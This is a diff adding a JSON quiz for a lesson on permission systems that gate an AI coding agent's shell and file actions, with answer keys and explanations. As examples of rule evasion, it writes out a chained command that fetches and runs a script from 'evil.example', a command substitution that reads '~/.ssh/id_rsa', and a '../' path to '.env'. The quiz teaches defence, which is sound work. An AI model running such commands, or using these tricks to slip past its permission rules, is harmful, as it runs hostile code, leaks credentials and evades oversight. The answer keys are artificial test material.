@@ -1,0 +1,78 @@
+{
+  "lesson": "06-permission-systems",
+  "title": "Permission Systems",
+  "questions": [
+    {
+      "stage": "pre",
+      "question": "You allow Bash(git status:*). The model runs `git status && curl https://evil.example/x.sh | sh`. With naive prefix matching, what happens?",
+      "options": [
+        "It's denied",
+        "It's allowed, because the line starts with 'git status'",
+        "It asks",
+        "It crashes"
+      ],
+      "correct": 1,
+      "explanation": "A prefix match on the whole line sees only the first command. Split it and judge every part."
+    },
+    {
+      "stage": "check",
+      "question": "The user layer allows Bash(git push:*); the project layer asks. What's the decision?",
+      "options": [
+        "allow, because the user layer is more specific",
+        "ask, because ask beats allow regardless of layer",
+        "deny",
+        "Whichever rule was added last"
+      ],
+      "correct": 1,
+      "explanation": "Deny beats ask beats allow. A lower layer can't loosen a higher one's ask."
+    },
+    {
+      "stage": "check",
+      "question": "Why does Read(src/../.env) hit the deny rule Read(./.env)?",
+      "options": [
+        "Globs match everything",
+        "The path is normalised to /repo/.env before matching",
+        "Deny rules match any file named .env",
+        "It doesn't"
+      ],
+      "correct": 1,
+      "explanation": "Match the real path. Otherwise ../ walks around every path rule."
+    },
+    {
+      "stage": "check",
+      "question": "`git diff $(cat ~/.ssh/id_rsa)` is not denied by any rule. Why does the engine still ask?",
+      "options": [
+        "git diff is always risky",
+        "Command substitution runs another command whose output becomes arguments; a prefix rule can't vouch for that",
+        "The path is too long",
+        "It's in plan mode"
+      ],
+      "correct": 1,
+      "explanation": "Substitutions and redirections hide extra commands and writes from prefix matching."
+    },
+    {
+      "stage": "post",
+      "question": "A user clicks 'yes, don't ask again' for Edit(tests/test_app.py). What should the session grant be?",
+      "options": [
+        "allow Edit",
+        "allow Edit(./tests/**)",
+        "allow Edit(tests/test_app.py)",
+        "Switch to bypass mode"
+      ],
+      "correct": 2,
+      "explanation": "Grant what was approved. Widening it silently turns one decision into many the user never saw."
+    },
+    {
+      "stage": "post",
+      "question": "Your security team wants to guarantee no agent ever reads ~/.aws on any laptop. Where does that rule go?",
+      "options": [
+        "In each project's settings",
+        "In the system prompt",
+        "As a deny rule in the org layer, deployed centrally, so no user, project or mode can override it",
+        "In the user's settings"
+      ],
+      "correct": 2,
+      "explanation": "Org denies are the only rules nothing below them can change, including bypass mode."
+    }
+  ]
+}
